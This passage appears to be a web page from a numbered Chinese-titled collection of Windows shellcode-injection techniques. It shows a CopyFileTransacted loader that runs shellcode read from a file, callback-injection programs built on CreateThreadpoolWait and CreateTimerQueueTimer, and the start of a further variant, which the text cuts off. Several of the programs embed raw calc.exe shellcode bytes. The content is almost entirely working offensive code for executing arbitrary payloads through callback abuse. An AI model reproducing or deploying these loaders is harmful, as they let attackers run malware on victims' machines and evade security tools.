<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"KtmW32.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;ktmw32.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hFile&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hTransaction&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;CopyFileTransacted.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Create&nbsp;a&nbsp;file&nbsp;to&nbsp;copy</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;hFile&nbsp;=&nbsp;CreateFile(<span class="hljs-string">L"C:\\Windows\\Temp\\Blank.txt"</span>,&nbsp;FILE_READ_DATA,&nbsp;FILE_SHARE_READ,&nbsp;<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;OPEN_ALWAYS,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hFile);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Create&nbsp;copy&nbsp;transaction</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;hTransaction&nbsp;=&nbsp;CreateTransaction(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;CopyFileTransacted(<span class="hljs-string">L"C:\\Windows\\Temp\\Blank.txt"</span>,&nbsp;<span class="hljs-string">L"C:\\Windows\\Temp\\Blankagain.txt"</span>,&nbsp;<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(LPPROGRESS_ROUTINE)hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;FALSE,&nbsp;<span class="hljs-number">0x0</span>,&nbsp;hTransaction);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Execute</span><br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;CommitTransaction(hTransaction);<br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Delete&nbsp;the&nbsp;files</span><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;DeleteFile(<span class="hljs-string">L"C:\\Windows\\Temp\\Blank.txt"</span>);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;DeleteFile(<span class="hljs-string">L"C:\\Windows\\Temp\\Blankagain.txt"</span>);<br><span class="linenum hljs-number">55</span><br><span class="linenum hljs-number">56</span>CLEANUP:<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">59</span><br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hTransaction)<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hTransaction);<br><span class="linenum hljs-number">62</span><br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">64</span>}<br><span class="linenum hljs-number">65</span><br><span class="linenum hljs-number">66</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">67</span></span>{<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">75</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">78</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">79</span><br><span class="linenum hljs-number">80</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">81</span>}<br></code></pre>
<h1 id="h25createthreadpoolwait"><span>25.回调函数注入 通过 CreateThreadPoolWait</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span>ï»¿<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;threadpoolapiset.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;This&nbsp;technique&nbsp;was&nbsp;developed&nbsp;by&nbsp;alfarom256&nbsp;please&nbsp;check&nbsp;out&nbsp;his&nbsp;awesome&nbsp;work!</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>&nbsp;LEN&nbsp;277</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-comment">//&nbsp;run&nbsp;calc</span><br><span class="linenum hljs-number">10</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">11</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">29</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">33</span></span>{<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hEvent;<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;hEvent&nbsp;=&nbsp;CreateEvent(<span class="hljs-literal">NULL</span>,&nbsp;FALSE,&nbsp;FALSE,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">/*<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;Can&nbsp;just&nbsp;shove&nbsp;a&nbsp;payload&nbsp;in&nbsp;RX&nbsp;mem&nbsp;and&nbsp;cast&nbsp;it&nbsp;to&nbsp;PTP_WAIT_CALLBACK<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;Â¯\_(ã)_/Â¯<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;LEN,&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;RtlMoveMemory(addr,&nbsp;op,&nbsp;LEN);<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;old;<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!VirtualProtect(addr,&nbsp;LEN,&nbsp;PAGE_EXECUTE_READ,&nbsp;&amp;old))<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,&nbsp;GetLastError());<br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;PTP_WAIT&nbsp;ptp_w&nbsp;=&nbsp;CreateThreadpoolWait((PTP_WAIT_CALLBACK)addr,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">53</span><br><span class="linenum hljs-number">54</span><br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;SetThreadpoolWait(ptp_w,&nbsp;hEvent,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;need&nbsp;to&nbsp;send&nbsp;events&nbsp;so&nbsp;the&nbsp;Threadpool&nbsp;Wait&nbsp;Callback&nbsp;has&nbsp;a&nbsp;chance&nbsp;to&nbsp;"catch"&nbsp;them&nbsp;and&nbsp;run</span><br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;SetEvent(hEvent);<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;WaitForThreadpoolWaitCallbacks(ptp_w,&nbsp;FALSE);<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;SetEvent(hEvent);<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">while</span>&nbsp;(TRUE)<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(<span class="hljs-number">9000</span>);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">65</span><br><span class="linenum hljs-number">66</span><br><span class="linenum hljs-number">67</span>}<br></code></pre>
<h1 id="h26createtimerqueuetimer"><span>26.回调函数注入 通过 CreateTimerQueueTimer</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span>ï»¿<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;wct.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>&nbsp;LEN&nbsp;277</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;timer;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;<span class="hljs-built_in">queue</span>&nbsp;=&nbsp;::CreateTimerQueue();<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;gDoneEvent&nbsp;=&nbsp;CreateEvent(<span class="hljs-literal">NULL</span>,&nbsp;TRUE,&nbsp;FALSE,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!::CreateTimerQueueTimer(&amp;timer,&nbsp;<span class="hljs-built_in">queue</span>,&nbsp;(WAITORTIMERCALLBACK)addr,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-number">100</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>))&nbsp;{<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Fail"</span>);<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(WaitForSingleObject(gDoneEvent,&nbsp;INFINITE)&nbsp;!=&nbsp;WAIT_OBJECT_0)<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"WaitForSingleObject&nbsp;failed&nbsp;(%d)\n"</span>,&nbsp;GetLastError());<br><span class="linenum hljs-number">49</span>}<br></code></pre>
<h1 id="h27createtimerqueuetimer_tech"><span>27.回调函数注入 通过 CreateTimerQueueTimer_Tech</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">13</span><span 